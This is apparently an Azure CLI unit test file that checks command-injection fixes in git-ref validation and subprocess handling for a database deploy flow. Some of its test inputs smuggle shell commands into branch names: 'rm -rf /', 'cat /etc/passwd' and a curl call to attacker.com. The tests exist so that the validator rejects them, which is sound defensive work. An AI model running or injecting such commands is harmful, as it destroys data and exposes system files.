# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------
"""Unit tests for command injection vulnerability fixes in RDBMS flexible-server deploy flow."""

import os
import unittest
from unittest.mock import patch, MagicMock, mock_open

from azure.cli.core.azclierror import InvalidArgumentValueError
from azure.cli.core.util import CLIError
from azure.cli.testsdk import TestCli


class CommandInjectionFixesTest(unittest.TestCase):
    """Test cases for command injection vulnerability fixes."""

    def setUp(self):
        """Set up test fixtures."""
        self.cli_ctx = TestCli()
        # Import here to ensure fresh instance
        from azure.cli.command_modules.rdbms._flexible_server_util import (
            validate_git_ref, run_subprocess
        )
        self.validate_git_ref = validate_git_ref
        self.run_subprocess = run_subprocess

    def test_validate_git_ref_accepts_valid_branches(self):
        """Test that validate_git_ref accepts valid branch names."""
        valid_refs = [
            'main',
            'develop',
            'feature/new-feature',
            'release-v1.0',
            'v1.0.0',
            'my_branch_name',
            'branch.name',
            'azure-cli-test',
        ]
        for ref in valid_refs:
            # Should not raise
            result = self.validate_git_ref(ref)
            self.assertEqual(result, ref)

    def test_validate_git_ref_rejects_shell_metacharacters(self):
        """Test that validate_git_ref rejects shell metacharacters."""
        dangerous_refs = [
            'main; rm -rf /',
            'develop$(whoami)',
            'branch`cat /etc/passwd`',
            'main|cat',
            'develop&background',
            'main<file',
            'develop>file',
            'branch"quoted"',
            "branch'single'",
            'branch\\backslash',
            'main\nmalicious',
            'develop$(curl attacker.com)',
        ]
        for ref in dangerous_refs:
            with self.assertRaises(InvalidArgumentValueError) as cm:
                self.validate_git_ref(ref)
            self.assertIn('invalid characters', str(cm.exception).lower())

    def test_validate_git_ref_rejects_non_string(self):
        """Test that validate_git_ref rejects non-string input."""
        with self.assertRaises(InvalidArgumentValueError):
            self.validate_git_ref(None)
        
        with self.assertRaises(InvalidArgumentValueError):
            self.validate_git_ref('')
        
        with self.assertRaises(InvalidArgumentValueError):
            self.validate_git_ref(123)

    def test_run_subprocess_accepts_list_args(self):
        """Test that run_subprocess accepts list arguments."""
        with patch('subprocess.Popen') as mock_popen:
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_popen.return_value = mock_process
            
            # Should not raise
            self.run_subprocess(['echo', 'hello'])
            
            # Verify Popen was called with list args
            mock_popen.assert_called_once()
            args, kwargs = mock_popen.call_args
            self.assertEqual(args[0], ['echo', 'hello'])

    def test_run_subprocess_rejects_string_args(self):
        """Test that run_subprocess rejects string arguments for security."""
        with self.assertRaises(CLIError) as cm:
            self.run_subprocess('echo hello')
        
        self.assertIn('list', str(cm.exception).lower())

    def test_run_subprocess_with_stdin_file(self):
        """Test that run_subprocess properly handles stdin_file parameter."""
        with patch('subprocess.Popen') as mock_popen, \
             patch('builtins.open', mock_open(read_data='test data')):
            
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_popen.return_value = mock_process
            
            # Should not raise
            self.run_subprocess(['gh', 'secret', 'set', 'KEY'], stdin_file='/tmp/input')
            
            # Verify file was opened
            mock_popen.assert_called_once()
            _, kwargs = mock_popen.call_args
            # stdin should be set (not None)
            self.assertIsNotNone(kwargs.get('stdin'))

    def test_run_subprocess_captures_output_by_default(self):
        """Test that run_subprocess captures stdout and stderr by default."""
        with patch('subprocess.Popen') as mock_popen:
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_process.stderr = MagicMock()
            mock_process.stderr.read.return_value = b''
            mock_popen.return_value = mock_process
            
            self.run_subprocess(['echo', 'hello'])
            
            # Verify PIPE was used for stdout and stderr
            _, kwargs = mock_popen.call_args
            self.assertEqual(kwargs.get('stdout'), -1)  # subprocess.PIPE
            self.assertEqual(kwargs.get('stderr'), -1)  # subprocess.PIPE

    def test_run_subprocess_displays_output_when_requested(self):
        """Test that run_subprocess displays stdout when stdout_show=True."""
        with patch('subprocess.Popen') as mock_popen:
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_popen.return_value = mock_process
            
            self.run_subprocess(['echo', 'hello'], stdout_show=True)
            
            # Verify PIPE was NOT used when stdout_show=True
            _, kwargs = mock_popen.call_args
            self.assertNotIn('stdout', kwargs)

    def test_run_subprocess_raises_on_nonzero_exit(self):
        """Test that run_subprocess raises CLIError on non-zero exit code."""
        with patch('subprocess.Popen') as mock_popen:
            mock_process = MagicMock()
            mock_process.returncode = 1
            mock_process.stderr = MagicMock()
            mock_process.stderr.read.return_value = b'Command failed'
            mock_popen.return_value = mock_process
            
            with self.assertRaises(CLIError):
                self.run_subprocess(['gh', 'secret', 'set', 'KEY'])

    def test_run_subprocess_cleans_up_stdin_file(self):
        """Test that run_subprocess properly closes stdin file."""
        with patch('subprocess.Popen') as mock_popen, \
             patch('builtins.open', mock_open(read_data='test')) as mock_file:
            
            mock_process = MagicMock()
            mock_process.returncode = 0
            mock_popen.return_value = mock_process
            
            self.run_subprocess(['gh', 'secret', 'set', 'KEY'], stdin_file='/tmp/input')
            
            # Verify file handle was closed
            mock_file.return_value.close.assert_called()

    @patch('azure.cli.command_modules.rdbms.flexible_server_custom_common.run_subprocess')
    @patch('azure.cli.command_modules.rdbms.flexible_server_custom_common.run_cmd')
    def test_github_actions_run_validates_inputs(self, mock_run_cmd, mock_run_subprocess):
        """Test that github_actions_run validates branch and action names."""
        from azure.cli.command_modules.rdbms.flexible_server_custom_common import (
            github_actions_run
        )
        
        mock_run_cmd.return_value = MagicMock(returncode=0)
        
        # Valid inputs should work
        github_actions_run('deploy', 'main')
        self.assertTrue(mock_run_subprocess.called)
        
        # Invalid branch should raise
        with self.assertRaises(InvalidArgumentValueError):
            github_actions_run('deploy', 'main; rm -rf /')

    @patch('azure.cli.command_modules.rdbms.flexible_server_custom_common.run_subprocess')
    @patch('azure.cli.command_modules.rdbms.flexible_server_custom_common.run_cmd')
    def test_github_actions_run_uses_list_args(self, mock_run_cmd, mock_run_subprocess):
        """Test that github_actions_run uses list arguments for subprocess call."""
        from azure.cli.command_modules.rdbms.flexible_server_custom_common import (
            github_actions_run
        )
        
        mock_run_cmd.return_value = MagicMock(returncode=0)
        
        github_actions_run('deploy', 'main')
        
        # Verify run_subprocess was called with list args
        mock_run_subprocess.assert_called_once()
        args = mock_run_subprocess.call_args[0][0]
        self.assertIsInstance(args, list)
        self.assertIn('gh', args)
        self.assertIn('workflow', args)
        self.assertIn('run', args)
        self.assertIn('deploy.yml', args)
        self.assertIn('main', args)


if __name__ == '__main__':
    unittest.main()
